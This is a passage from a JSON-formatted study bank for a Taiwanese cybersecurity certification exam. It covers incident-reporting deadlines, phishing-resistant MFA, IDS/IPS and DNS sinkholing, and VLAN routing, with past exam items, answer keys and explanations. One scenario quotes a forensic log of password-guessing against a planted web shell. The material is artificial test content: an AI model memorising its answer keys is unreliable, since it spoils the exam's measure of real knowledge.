   "summary": "資通安全管理法的事件通報（子法已於 115/1/5 修正並改名為「資通安全事件通報應變及演練辦法」）有三個不同的時間要分清楚：知悉事件後 1 小時內通報；主管機關對通報的審核有時限（1、2 級 8 小時；3、4 級 2 小時，新版條文寫作「重大資通安全事件」）；以及完成損害控制或復原的時限（1、2 級 72 小時；3、4 級 36 小時，新版條文同樣寫作「重大資通安全事件」）。事件分四級，級別越大越嚴重，等級看資訊或系統是否核心業務、遭洩漏或竄改的程度，以及是否無法在可容忍中斷時間內回復。遇到影響核心業務、無法在可容忍中斷時間內復原的事件，除了通報與隔離，還要建議資安長啟動業務持續計畫。公司治理面則包含配置資安長與專責人力、資安納入內部控制與公司治理評鑑、重大資安事件依規定揭露；情資分享可透過 ISAC，建議以 STIX、TAXII 的格式與機制交換。",
   "keyPoints": [
    "通報、審核、完成損害控制或復原是三個動作、三組時限：通報是知悉後 1 小時內；損害控制或復原 1、2 級 72 小時、3、4 級 36 小時；別互相套用。",
    "時間起點是「知悉」事件，不是「發生」事件；選項寫「事件發生後」要特別小心。",
    "事件分四級，第一級最輕微、第四級最嚴重；核心業務受影響且無法在可容忍中斷時間內回復，等級不會判得太低。",
    "核心業務遭勒索軟體、無法在可容忍中斷時間內運作 → 通報、隔離受害主機，並建議資安長啟動業務持續計畫。",
    "公司治理題：資安長與專責人力要配置、重大事件要揭露、資安納入內控與公司治理評鑑；加入 TWCERT／CC 不是強制。"
   ],
   "trap": "把 1 小時（通報）、8 小時（審核）、72／36 小時（損害控制或復原）互相混用，或把事件等級的數字方向搞反（第四級才是最嚴重）。",
   "quiz": [
    {
     "stem": "情境如附圖所示。當資安人員進行風險評鑑與處理時，接獲內部人員通報發生勒索病毒感染之資通安全事件，該事件已造成檔案交換主機（未涉及關鍵基礎設施維運）內的檔案遭加密無法開啟，系統亦無法正常使用，影響了核心業務的正常運作且無法於可容忍中斷時間內回復正常運作。試問有關資安人員對於此一事件處理之作為，下列何者錯誤？",
     "options": [
      "一小時內通報金管會",
      "資通安全事件等級判斷為二級",
      "對該檔案交換主機進行隔離",
      "建議資安長啟動該核心業務之業務持續計畫"
     ],
     "answer": 1,
     "context": "A 公司為一金融機構（資通安全責任等級 A 級），近期因為駭客攻擊事件頻仍，因此該公司資安長要求內部必須針對目前外在資安環境以及內部資訊資產的變化，重新檢視與評估潛在的風險並於以適切之處理，以確保該公司的資訊安全。",
     "hint": "回想事件通報應變辦法的等級判斷標準、通報時限與應變作為，逐項判斷每項作為是否正確。",
     "explanation": "答案 B。事件造成核心業務無法於可容忍中斷時間內回復正常運作，屬較嚴重的情形，依辦法第 2 條，未涉及關鍵基礎設施維運之核心業務或核心資通系統運作受影響、無法於可容忍中斷時間內回復，屬第三級，所以判為二級是錯的。A 知悉事件後 1 小時內向主管機關（金融業為金管會）通報，是正確作為；C 對受感染的檔案交換主機隔離，是正確的遏制手段；D 無法在可容忍中斷時間內回復，應建議資安長啟動該核心業務的業務持續計畫，是正確作為。",
     "source": "114-1 第19題"
    },
    {
     "stem": "依照我國「資通安全事件通報及應變辦法」的規定，當發現一般公務機密、敏感資訊、涉及關鍵基礎設施維運之核心業務資訊或核心資通系統遭輕微竄改之情事時，公務機關知悉資通安全事件後，應依規定在多少時間之內完成損害控制或復原作業，並依主管機關指定之方式及對象辦理通知事宜？",
     "options": [
      "12 小時",
      "24 小時",
      "36 小時",
      "72 小時"
     ],
     "answer": 2,
     "hint": "辦法把事件分四級，不同等級的「完成損害控制或復原」時限不同；先判斷題幹情境屬輕度還是重度那一級，再回想該級的時限。",
     "explanation": "答案 C。依（出題時的）資通安全事件通報及應變辦法第 2 條（115/1/5 修正後改名為資通安全事件通報應變及演練辦法，該款已刪去「敏感資訊」字樣，等級仍為第三級），一般公務機密、敏感資訊、涉及關鍵基礎設施維運之核心業務資訊或核心資通系統遭輕微竄改，屬 3 級事件，應於知悉後 36 小時內完成損害控制或復原作業，並依主管機關指定方式通知（1、2 級為 72 小時，3、4 級為 36 小時）。A 12 小時與 B 24 小時不是辦法所定的完成時限；D 72 小時是 1、2 級的時限。",
     "source": "112-2 第20題"
    },
    {
     "stem": "發現公司並未依照法規（資安法與上市上櫃資通安全管控指引）定期進行相關作為，請問下列敘述何者正確？",
     "options": [
      "公司可以不需配置資安長，只需配置設適當資安人力",
      "公司遭受重大資安事件，不需揭露相關資安事件重大訊息",
      "強制公司加入台灣電腦網路危機處理暨協調中心",
      "資安納入內部控制，以及資安納入公司治理評鑑"
     ],
     "answer": 3,
     "context": "【題組 2】\n駭客勒索集團入侵年收五百億上市公司，對其重要資料庫系統與研發系統破壞勒索加密，經過相關緊急應變後，費時近半個月才恢復公司正常運營，事後總經理召開檢討會議進行檢討。",
     "hint": "回想資安法與上市上櫃公司資通安全管控指引的要求，逐項判斷每句是否正確。",
     "explanation": "答案 D。勒索集團入侵上市公司、公司未依法規定期作為，應依資安法與上市上櫃資通安全管控指引，把資安納入內部控制與公司治理評鑑。A 公司不需要資安長是錯的，指引要求配置資安長與專責人力；B 遭受重大資安事件不需揭露是錯的，重大資安事件要依規定揭露重大訊息；C 強制加入 TWCERT／CC 並非規定，情資分享是自願參與。",
     "source": "112-1 第17題"
    },
    {
     "stem": "依照我國「資通安全事件通報及應變辦法」的規定，公務機關知悉資通安全事件後，應於多少時間之內，依主管機關指定之方式及對象，進行資通安全事件之通報？",
     "options": [
      "1 小時內",
      "8 小時內",
      "24 小時內",
      "72 小時內"
     ],
     "answer": 0,
     "hint": "「通報」「審核」「完成損害控制或復原」是三個不同動作，各有各的時限，別互相套用；先確認題目問的是哪一個。",
     "explanation": "答案 A。依辦法，公務機關知悉資通安全事件後，應於 1 小時內依主管機關指定方式及對象通報。B 8 小時是主管機關審核的時限（1、2 級）；C 24 小時、D 72 小時都不是通報時限，72 小時是 1、2 級事件完成損害控制或復原的時限。",
     "source": "112-1 第22題"
    },
    {
     "stem": "關於資安事件應變通報與情資分享，下列敘述哪些「不」正確？（複選）",
     "options": [
      "資通安全管理法子法規定，公務機關辦理資通安全事件之通報，應於事件發生後一小時內進行通報",
      "資安事件分享屬 ISAC 服務範圍之一",
      "資通安全管理法子法規定之事件嚴重等級共分四級，第一級為最嚴重，第四級為最輕微",
      "我國 ISAC 機制設計，針對跨領域之資安情資分享，建議採用 STIX 與TAXII之格式與機制"
     ],
     "answer": [
      0,
      2
     ],
     "context": "（原卷另附工廠與辦公室網路架構圖，以及 Nessus 與 IP 掃描工具畫面截圖，與本題無關）",
     "hint": "回想事件通報辦法的時限起算點與事件分級，以及 ISAC 的服務與情資交換格式，逐項判斷每句。",
     "explanation": "答案 A、C。題目問不正確的敘述。A 辦法規定的是知悉事件後 1 小時內通報，而不是「事件發生後」一小時內，時間起點錯了，所以不正確；C 事件嚴重等級共四級沒錯，但第一級為最輕微、第四級為最嚴重，題目把方向說反，所以不正確。B 資安事件分享屬 ISAC 服務範圍之一，D 跨領域資安情資分享建議採用 STIX 與 TAXII 格式與機制，這兩項敘述正確。",
     "source": "111-1 第20題"
    }
   ]
  },
  {
   "id": "1.2-09",
   "section": "1.2",
   "title": "身分鑑別與 MFA",
   "examHits": 10,
   "examRefs": [
    "115-2 第22題",
    "113-2 第14題",
    "113-2 第27題",
    "113-1 第13題",
    "112-1 第15題",
    "111-1 第29題",
    "111-1 第30題",
    "111-1 第31題",
    "111-1 第32題",
    "108-1 第18題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "MFA 的重點是「能不能抵抗釣魚」。攻擊者用 AitM（中間人代理）把你輸入的密碼、簡訊 OTP、推播確認即時轉送給真正的網站，所以簡訊 OTP、推播同意、一次性密碼這類能被轉手的因子，都擋不了。真正抗釣魚的是 FIDO2／WebAuthn（Security Key、Passkey）與 PKI 憑證式驗證，因為驗證綁定網站來源或使用私鑰簽章，轉送出去也沒用。密碼政策方面，最小密碼長度是增加組合數，密碼歷程是防止重複使用舊密碼，最短使用效期是避免用歷程機制輪流使用舊密碼，圖形驗證碼是分辨人與機器。PPP 認證可用 PAP、CHAP、EAP，但連線的建立、設定與中斷由鏈結控制協定（LCP）負責。",
   "keyPoints": [
    "看到「AitM、MFA 被繞過、釣魚」→ 選抗釣魚驗證：FIDO2／Security Key、PKI 憑證式 MFA；簡訊 OTP、推播確認、更長更複雜的密碼都不夠。",
    "保護員工個人帳號：加長密碼抵抗字典攻擊、導入多因子驗證；SOC 是偵測、限制 IP 是縮小暴露面，不直接保護帳號。",
    "密碼政策各條的目的：最小長度＝增加組合；歷程＝防重複使用；最短效期＝防輪流使用舊密碼；圖形驗證碼＝區分人機。",
    "PPP：LCP 負責連線建立、設定與中斷；PAP、CHAP、EAP 是可選的認證階段，不是建立連線的協定。",
    "PAP 傳送明文密碼、CHAP 用挑戰回應、EAP 可擴充多種認證機制；越新越強，但前提是仍要看是否綁定來源。"
   ],
   "trap": "以為「推播確認」或「簡訊 OTP」已經夠安全，其實 AitM 可以即時轉送；另外把密碼歷程記錄誤以為是為了「方便使用者找回舊密碼」。",
   "quiz": [
    {
     "stem": "近期發生多起攻擊者利用AitM（Adversary-in-the-Middle）技術繞過多因子驗證的案例。若貴公司計畫升級現有的MFA機制以防禦此類攻擊，下列何項方案最為有效且符合FIDO2標準？",
     "options": [
      "部署實體安全設備（Security Key）驗證",
      "採用推播通知（Push Notification）並要求使用者點擊確認",
      "強制員工使用簡訊（SMS OTP）作為登入的第二因子",
      "實施複雜密碼策略，要求每45天更換一次並不得重複"
     ],
     "answer": 0,
     "hint": "回想 AitM 如何繞過 MFA，以及 FIDO2 的設計，逐項判斷每個方案能否擋下。",
     "explanation": "答案 A。AitM 攻擊會充當使用者與真網站之間的代理，即時轉送密碼、OTP 與推播確認。Security Key 符合 FIDO2，驗證時綁定網站來源並以私鑰簽章，轉送到假網站或代理上無效，具有抗釣魚特性。B 推播通知要求使用者點擊確認，容易被疲勞轟炸或誘騙同意；C 簡訊 OTP 可被代理即時轉送，也可能被攔截；D 複雜密碼與定期更換不能阻止攻擊者轉送已輸入的憑證。",
     "source": "115-2 第22題"
    },
    {
     "stem": "情境如附圖一所示，本次事件範圍廣泛，涵蓋範圍除了有網站服器主機、網域控制站，而鑑識小組所發現的問題，包含有如附圖二的項目，鑑識小組認為應有網站零日漏洞被利用。請問下列哪 2 項對於員工個人帳號保護最為有效？",
     "options": [
      "EIP（Enterprise Information Portal）系統應限定僅有內部 IP 得以連接",
      "密碼破解類的字典檔攻擊，應宣導加長密碼長度以提升帳號安全",
      "導入 SOC（Security Operation Center）機制使入侵行為即早得到預警",
      "應導入多因子身份驗證以維護其安全"
     ],
     "answer": [
      1,
      3
     ],
     "context": "附圖一\n機房管理是安全營運中最為貼近實體安全的議題，在一次的實地查核中，發現有一網站伺服器主機上存有免殺（Anti Anti-Virus）Web shell，安裝於該主機的防毒軟體，並未即時的偵測到該惡意反向連接的 Web shell，資訊安全人員隨即啟動鑑識及調查，發現防火牆上的存取記錄中，每隔一周即有一次來自於外部的記錄. 經過過濾 web shell 所在路徑，得到下面的幾個條列記錄，離現今已有半年以上：\nPost /bin_file/tmp/resver.php 200 13.137.38.56 admin 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 admin1 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 admin123 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 user 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 manager 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 root 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 13.137.38.56 sudo 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 jason 1q2w#E$R\n\n詳細追查該檔案的建立日期為半年前，修改時間為 1 個月前，但在追查相關記錄時發現，外部防火牆上的時間校時為防火牆原廠提供的 NTP（Network Time Protocol），網站應用程式防火牆、外部防火牆及網站主機均有時間誤差。\n\n因公司所有終端電腦及伺服器均加入網域，為有效控制資安事件，鑑識人員追查網域控制站的安全性事件，發現有一管理人員的帳號密碼透過該網站伺服器向網域控制站進行登入，在過去這三個月來，每周均有一次透過網站伺服器主機上的員工入口網站主機登入驗證通過。\n\n同時發現該帳號於網站主機上，安全性事件記錄中，有大量的 4625 事件編號產生，且於網站伺服器的安全性事件中發現在約 2 個月前，已有大量人員的網域帳號因帳號鎖定，需要管理人員解鎖事件發生。\n\n更於上周有員工存放於網路共享磁碟上置放的資料，副檔名變成 encrypt123，CEO 認為這已影響到公司營運。\n\n附圖二\n1. 鐘訊未同步，造成受侵害的主機有時戳落差，鑑識時易產生證據時序錯誤。\n2. 網站伺服器 Log 中出現類似帳號密碼的猜測行為，但可能尚未找到有效的帳密組合。\n3. 網站主機上向網域控制站的安全性事件中，已有某一管理人員帳密外洩，且透過員工入口網登入驗證成功。\n4. 員工有大量的帳號鎖定狀況產生。\n5. 共用磁碟中出現大量檔案副檔名被變更為 Encrypt123，疑似遭到勒索軟體侵害。",
     "hint": "逐項問：這項措施能不能直接讓員工個人帳號更難被盜用？",
     "explanation": "答案 B、D。事件中管理者帳號密碼外洩、有大量 4625 登入失敗與帳號鎖定，屬帳號被猜測與盜用。B 加長密碼可提高字典檔與暴力猜測的難度，D 導入多因子驗證，即使密碼外洩，攻擊者也難以登入，兩者都直接保護員工帳號。A 限定僅內部 IP 可連 EIP 屬縮小暴露面，C 導入 SOC 屬偵測與預警，這兩項不是直接保護帳號憑證本身。（本題官方答案為 B、D，A、C 的上述歸類為對題幹「個人帳號保護」的解讀，官方未說明。）",
     "source": "113-2 第27題"
    },
    {
     "stem": "近年來 MFA 身份驗證機制遭攻擊者以網路釣魚攻擊破解之趨勢上升，因此抵禦網路釣魚多因素驗證（Phishing-resistant MFA）機制受到重視，因其可有效降低前述之攻擊成功機率。下列哪些身份驗證方式符合抵抗網路釣魚攻擊之特性？",
     "options": [
      "FIDO Auth",
      "MMS MFA",
      "PKI-based MFA",
      "增加密碼長度"
     ],
     "answer": [
      0,
      2
     ],
     "hint": "回想抗釣魚 MFA 的定義（如 CISA 的說明），逐項判斷每種方式是否符合。",
     "explanation": "答案 A、C。抗釣魚 MFA 的關鍵是驗證資料綁定正確網站或使用私鑰簽章，使攻擊者即使騙到使用者也無法轉送：A FIDO 驗證與 C PKI 憑證式 MFA 符合。B MMS MFA（以多媒體簡訊傳送的一次性驗證碼）仍是可被轉手的 OTP；D 增加密碼長度不改變被釣魚後密碼會被騙走的事實。（官方公告 A、C 或 A、B、C 皆給分，官方未說明 B 也給分的理由。）",
     "source": "113-1 第13題"
    },
    {
     "stem": "身分驗證機制是利用帳戶密碼進行作為識別使用者的機制，是多數資訊系統驗證使用者身分的基礎。關於身分驗證機制的敘述，下列哪些正確？",
     "options": [
      "設定「最小密碼長度」的原則主要是要產生更多的密碼組合，提高被破解的難度。美國國家標準暨技術研究院（National Institute of Standards and Technology, NIST）建議最小長度為 8 個字元",
      "設定「密碼歷程記錄」的原則為了方便使用者自己找到以前使用過的密碼",
      "設定「密碼最短使用效期」的原則是指該密碼必須使用一段時間後才能再次進行變更，通常是配合密碼歷程機制啟用",
      "「圖形驗證碼」是設計一組對人類能夠輕易回答而對電腦是困難的題目，以作為區分執行動作的是電腦還是人類的行為"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "hint": "逐項回想每條密碼原則或驗證機制的目的，判斷描述是否正確。",
     "explanation": "答案 A、C、D。A 最小密碼長度可增加可能的組合數，提高破解難度，NIST 建議最小 8 個字元；C 密碼最短使用效期要求密碼使用一段時間後才能再變更，通常搭配密碼歷程記錄，避免連續改密碼後又改回舊密碼；D 圖形驗證碼設計成人容易回答、電腦難以回答，用來區分人與機器。B 密碼歷程記錄是為了避免使用者重複使用舊密碼，不是為了方便找回舊密碼，所以敘述錯誤。",
     "source": "112-1 第15題"
    },
    {
     "stem": "請問點對點協定在建立連線時，透過下列何項協定建立和中斷連線？",
     "options": [
      "只能用通行碼鑑別協定或詢問握手認證協定",
      "只能用擴展認證協定",
      "鏈接控制協定（Link Control Protocol, LPC）",
      "通行碼鑑別協定、詢問握手認證協定、擴展認證協定三者都可"
     ],
     "answer": 2,
     "context": "【題組 3】\n點對點協定（Point to Point Protocol, PPP）是網際網路工程任務組（Internet Engineering Task Force, IETF），推出的點對點網路協定，主要被應用在建立網路上的兩個節點之前的連線。因 PPP 本身不屬於安全協定，因此，提供了一個可選擇認證階段，早期常被使用的認證方式為通行碼鑑別協定（Password Authentication Protocol, PAP）和詢問握手認證協定（Challenge handshake authentication protocol, CHAP），後來又新增了擴展認證協定（Extensible Authentication Protocol, EAP）來增加可以支援的認證機制。",
     "hint": "回想 PPP 建立連線的各個階段與各階段使用的協定，逐項比對。",
     "explanation": "答案 C。PPP 在連線建立、設定與中斷時使用鏈結控制協定（Link Control Protocol，LCP；選項寫成 LPC 是筆誤）。PAP、CHAP、EAP 是 PPP 的可選認證階段所採用的協定，負責驗證身分，不負責建立與中斷連線；所以 A、B、D 都不對。",
     "source": "111-1 第29題"
    }
   ]
  },
  {
   "id": "1.2-10",
   "section": "1.2",
   "title": "IDS／IPS 與網路邊界防護",
   "examHits": 9,
   "examRefs": [
    "114-2 第13題",
    "114-2 第16題",
    "112-1 第12題",
    "111-1 第17題",
    "110-1 第6題",
    "109-1 第19題",
    "109-1 第27題",
    "108-1 第26題",
    "108-1 第30題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "邊界防護題考「放在哪、用哪一種模式」。IDS 是旁路被動監聽，只偵測與告警（有些可送 TCP reset 中斷連線）；IPS 串接在流量路徑上（in-line），能主動丟棄惡意封包、阻斷連線。遇到內部 DNS 出現大量指向 .onion（Tor）的查詢，最有效又不影響正常服務的做法是在 DNS 層把可疑頂級網域解析到內部黑洞（sinkhole），而不是封鎖全部 DNS。網路管理要區分資料流與控制流：像 ISP 那樣把數據骨幹與管理網路（DCN）隔離，管理走帶外（Out-of-Band），搭配關閉不必要的控制埠、NAC 與防火牆限制可進入控制網段的設備。防火牆管理要守最小權限、定期檢視規則、告警要有專人處置。HTTP/3 是 HTTP over QUIC，QUIC 使用 UDP。",
   "keyPoints": [
    "看到「偵測到可疑 DNS 查詢又不影響服務」→ DNS sinkhole 把可疑網域解到內部黑洞；封鎖所有 53 埠或等使用者自己改善都不合適。",
    "IDS＝旁路被動監聽、偵測與告警；IPS＝串接在線上主動阻擋與丟棄封包；說 IPS 要「通知防火牆」才能丟包是錯的。",
    "管理網路與資料網路分離（帶外管理）：控制埠只開 Console／Management，並用 NAC、防火牆限制只有特定管理設備能進入控制網段。",
    "防火牆管理原則：對外管理埠關閉、規則定期檢視、告警專人處置；把最高權限交給維護廠商違反最小權限。",
    "HTTP/3＝HTTP over QUIC，底層用 UDP；不少 Proxy 會強制退回 TCP 來做檢查；仍使用 TCP 的說法是錯的。"
   ],
   "trap": "以為封鎖整個 53 埠或要求使用者自我修正就是「立即防禦」；或把 IDS／IPS 的角色對調，以及誤以為 HTTP/3 還是跑在 TCP 上。",
   "quiz": [
    {
     "stem": "若安全營運中心（SOC）於內部 DNS 伺服器偵測到大量指向 *.onion 的查詢，但防火牆尚未攔阻，下列何項即時防禦措施最符合效率及不影響正常服務運作？",
     "options": [
      "直接封鎖所有 53/TCP 與 53/UDP 流量",
      "通知使用者可能違反政策，待其自我修正",
      "DNS 層將可疑頂級網域（Top-Level Domain, TLD）解析為内部黑洞（sinkhole）IP",
      "調高 DNS 服務優先權，以降低查詢逾時"
     ],
     "answer": 2,
     "hint": "逐項檢查題目的兩個條件：能否立即生效？對正常服務的影響有多大？",
     "explanation": "答案 C。內部 DNS 出現大量 *.onion 查詢，表示可能有主機嘗試連 Tor 隱藏服務，（正常網域名稱解析本就不應解析 .onion）。在 DNS 層把可疑頂級網域解析到內部黑洞（sinkhole）IP，立即生效、只影響可疑查詢，並可藉此找出發出查詢的主機。A 封鎖所有 53 埠會讓整個名稱解析中斷；B 通知使用者自行修正，沒有立即防禦效果；D 調高 DNS 服務優先權與威脅無關。",
     "source": "114-2 第13題"
    },
    {
     "stem": "如附圖所示。Anet 為一家 ISP 網際網路服務商，其參考關鍵基礎設施的網路管理要求，將公司的網路服務系統分割為 2 個獨立的部份：一、Data Service Backbone 數據服務骨幹網路僅提供數據服務流，用以提供終端客戶上網與雲端服務、二、 Management DCN（Data Control Network）管理數據網路，用以建立網路設備的控制訊務流並提供操作服務網路設備與系統之功能；此外，並將骨幹網路設備關閉網路通道內（In-Band）的連線控制功能，僅提供通道外（Out-Band）的控制功能，避免非必要的設備連線風險。因應此項維運安全需求，請問下列哪些規劃功能較適合應用於此系統架構之中？",
     "options": [
      "數據服務骨幹網路設備上，除了 Console 和 Management 埠之外，關閉所有的控制連線埠位",
      "在 DCN 網路中建置流量清洗（DDoS Mitigation）系統，避免少數用戶遭受 DDoS 攻擊時，影響所有其他客戶的正常網路服務與連線品質",
      "在 DCN 網路上建置 NAC（Network Access Control）網路存取控制系統，管理僅有授權的設備可進行連接通訊和設備操作功能",
      "以網路防火牆將各網路區塊隔離開來，並僅限 DCN 的特定設備或網址可能進入數據服務骨幹網路設備的控制網段和埠號"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "context": "（原題附圖為網路架構示意圖，內容：）\nService Domain：amazon web services、Internet（兩者經線路連入 Data Service Backbone）\nManagement DCN：Management Server、Network management terminal（以 Control Flow 虛線連到 Data Service Backbone 內的各台路由器）\nData Service Backbone：內有多台路由器互連，兩側為 Data Service Flow\nEnd User：行動裝置與電腦使用者（連入 Data Service Backbone）",
     "hint": "先分清楚兩個網路各承載什麼流量、誰能存取，再看每項措施的位置與目的是否對得上它所在的網路。",
     "explanation": "答案 A、C、D。題幹把數據服務骨幹與管理網路（DCN）分開，並要求骨幹設備只開通道外（Out-Band）控制。A 骨幹設備除 Console 與 Management 埠外關閉所有控制埠；C 在 DCN 上建置 NAC，只讓授權設備連接與操作；D 以防火牆隔離各網路區塊，且只限 DCN 的特定設備或網址進入骨幹設備的控制網段與埠號，都符合此架構。B 把 DDoS 流量清洗系統放在 DCN 並不恰當：DDoS 攻擊衝擊的是客戶的資料服務流量，清洗應處理資料服務流，而 DCN 是管理控制流量的網路，位置與目的對不上。",
     "source": "114-2 第16題"
    },
    {
     "stem": "當網路防火牆受到偵測攻擊時，下列何者最「不」適宜？",
     "options": [
      "對外管理 Port 應該關閉",
      "最高權限應該提供給維護廠商",
      "定期檢視規則是否過期",
      "告警應該有專人確認與處置"
     ],
     "answer": 1,
     "hint": "回想防火牆維運管理的基本原則，逐項判斷每項做法是否符合。",
     "explanation": "答案 B。防火牆的管理要遵守最小權限，最高權限提供給維護廠商風險太大，是最不適宜的做法。A 對外管理埠應該關閉，避免被攻擊者直接連到管理介面；C 定期檢視規則是否過期，避免殘留不必要的放行；D 告警要有專人確認與處置，才能真正發揮偵測效果。",
     "source": "112-1 第12題"
    },
    {
     "stem": "HTTP/3 標準已經開始被國內外大型網站所建置使用，而 HTTP/3 安全性更是高於 HTTP/1 與 HTTP/2，關於 HTTP/3 的技術與特性，下列敘述哪些正確？",
     "options": [
      "HTTP/3 就是HTTP over QUIC 方式來進行資料傳送與接收，而 QUIC 是 Google所提出的標準",
      "QUIC 採用 UDP 通訊協定，目前許多 Proxy產品會採用強迫轉回到TCP 方式進行過濾攔阻",
      "在HTTP/3 採取更嚴格安全檢核標準，目前駭客所使用中間人攻擊（Man-In-The-Middle attack, MITM）之工具與技術很難加工處理",
      "HTTP/3 仍使用TCP 協定作為對話（Session）的傳輸層"
     ],
     "answer": [
      0,
      1,
      2
     ],
     "hint": "回想 HTTP/3 與 QUIC 的技術特性，逐項判斷每句是否成立。",
     "explanation": "答案 A、B、C。HTTP/3 是 HTTP over QUIC，QUIC 起源於 Google 並已標準化，A 正確；QUIC 使用 UDP，許多 Proxy 為了過濾攔阻，會強迫退回 TCP，B 正確；HTTP/3 內建較嚴格的安全檢核（加密），使常見中間人攻擊工具難以加工處理，C 正確。D 說仍使用 TCP 作為傳輸層是錯的，QUIC 建立在 UDP 之上。",
     "source": "111-1 第17題"
    },
    {
     "stem": "入侵檢測系統（Intrusion-Detection System, IDS）與入侵預防系統（Intrusion Prevention System, IPS）具監測及防禦的雙重功能，可即時偵測到攻擊事件的發生，並中止或阻絕入侵行為，包括自動攔截棄置攻擊封包，下列敘述何者較「不」正確？",
     "options": [
      "IDS 防禦方式為被動監聽（Passive sniffer mode）",
      "IDS 防禦動作可透過 TCP reset 來中斷連線",
      "IPS 防禦方式為主動防禦（Active in-line mode）",
      "IPS 防禦動作為通知防火牆丟棄惡意封包、中斷連線"
     ],
     "answer": 3,
     "hint": "回想 IDS 與 IPS 的部署方式與處置能力，逐項判斷每句是否成立。",
     "explanation": "答案 D。IDS 以被動監聽（旁路）方式偵測並告警，可利用 TCP reset 中斷連線；IPS 以主動串接（in-line）方式部署，本身直接攔截並丟棄惡意封包、中斷連線。D 說 IPS 的防禦動作是「通知防火牆」去丟棄封包，把動手的對象說錯，較不正確。A、B、C 的描述都符合 IDS／IPS 的特性。",
     "source": "110-1 第6題"
    }
   ]
  },
  {
   "id": "1.2-11",
   "section": "1.2",
   "title": "網路分段、VLAN 與路由",
   "examHits": 9,
   "examRefs": [
    "112-2 第11題",
    "112-1 第11題",
    "110-1 第21題",
    "110-1 第22題",
    "110-1 第23題",
    "110-1 第24題",
    "109-1 第8題",
    "108-1 第29題",
    "108-1 第32題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "網路分段題考的是「重要的主機放對區、VLAN 要有路由才能互通」。基本原則：區分內外網、對外網站與資料庫分在不同網段、目錄伺服器（AD）這類核心服務不要放在一般辦公網段，並可用 VLAN 切割網段。VLAN 之間不能直接通訊，要靠路由器或三層交換器；如果路由器只設定了部分 VLAN 的子介面，沒設定的 VLAN 就無法跨 VLAN 通訊。路由器與交換器之間用單一條連線承載多個 VLAN、路由器上切出多個子介面，叫做 Router on a stick。路由協定方面，RIP 是距離向量協定，最大跳數 15（超過視為不可達），每 30 秒更新；OSPF 是鏈路狀態協定，用 SPF 演算法。避免路由迴圈的技術有路由毒化、水平分割、抑制計時器。",
   "keyPoints": [
    "網路架構題：區分內外網、網站與資料庫分段、AD 這類核心服務不要放辦公網段；VLAN 是合理的切割方式。",
    "跨 VLAN 不通 → 先看路由器有沒有為該 VLAN 設定子介面（閘道 IP）；交換器 SW 不需設定閘道 IP，不同 VLAN 本來就是要經路由。",
    "單一實體線承載多個 VLAN、路由器上切子介面＝Router on a stick。",
    "RIP：距離向量、最大 15 跳、每 30 秒更新；OSPF：鏈路狀態、SPF、動態路由。",
    "防路由迴圈：路由毒化（Route Poisoning）、水平分割（Split Horizon）、抑制計時器（Hold-down）；Convergence（收斂）是結果狀態，不是防迴圈技術。"
   ],
   "trap": "把 RIP 的更新時間（30 秒）記成 5 秒，或把「收斂」當成防路由迴圈的機制；VLAN 不通時也常誤以為只要在交換器設閘道。",
   "quiz": [
    {
     "stem": "關於進行網路架構設計的敘述，下列何者較「不」適當？",
     "options": [
      "應區分內外網",
      "網站跟資料庫最好在不同網段",
      "目錄伺服器 AD 應該放在辦公網段",
      "可以透過 VLAN 切割網段"
     ],
     "answer": 2,
     "hint": "回想網路分區規劃的原則，逐項判斷每句建議是否合適。",
     "explanation": "答案 C。目錄伺服器 AD 掌管整個網域的帳號與驗證，是核心服務，不應該放在使用者最多、風險最高的辦公網段，應放在伺服器或管理的受保護區段。A 區分內外網、B 網站與資料庫放在不同網段以降低橫向移動風險、D 透過 VLAN 切割網段，都是合理的網路架構設計。",
     "source": "112-2 第11題"
    },
    {
     "stem": "路由協定（Routing Protocol）是一種指定封包轉送方式的網路協定，請問關於路由協定之敘述，下列何者錯誤？",
     "options": [
      "路由資訊協定（Route Information Protocol, RIP）是最簡單的路由協定，主要傳遞路由資訊，透過每隔 5 秒廣播一次路由表來維護相鄰路由器的位置關係",
      "路由資訊協定（Route Information Protocol, RIP）是一個距離向量路由協定，最大 hop 數為 15，超過 15 hop 的網路則認為目標網路不可到達",
      "開放式最短路徑優先（Open Shortest Path First, OSPF）協定是屬於鏈路狀態路由協定，係利用所維護的網路狀態資料庫，透過最短路徑優先演算法（SPF 演算法）計算來得到路由表",
      "開放式最短路徑優先（Open Shortest Path First, OSPF）協定是屬於動態路由協定 0"
     ],
     "answer": 0,
     "hint": "回想 RIP 與 OSPF 的類型與主要參數，逐項判斷每句是否成立。",
     "explanation": "答案 A。RIP 是距離向量協定，預設每 30 秒廣播（RIPv1）一次路由表，不是每 5 秒；B RIP 最大跳數為 15，超過視為不可達，正確；C OSPF 是鏈路狀態協定，用網路狀態資料庫與 SPF 演算法算出路由表，正確；D OSPF 是動態路由協定，正確。",
     "source": "112-1 第11題"
    },
    {
     "stem": "題組背景描述如附圖。Host C 反應無法存取 Host B分享的資源的原因為下列何者？",
     "options": [
      "Host C 與Host B在不同 VLAN",
      "SW1 未設定 Gateway IP 192.168.10.1",
      "R1未設定 Gateway IP 192.168.10.1",
      "Host C 未設定Gateway IP 192.168.0.1"
     ],
     "answer": 2,
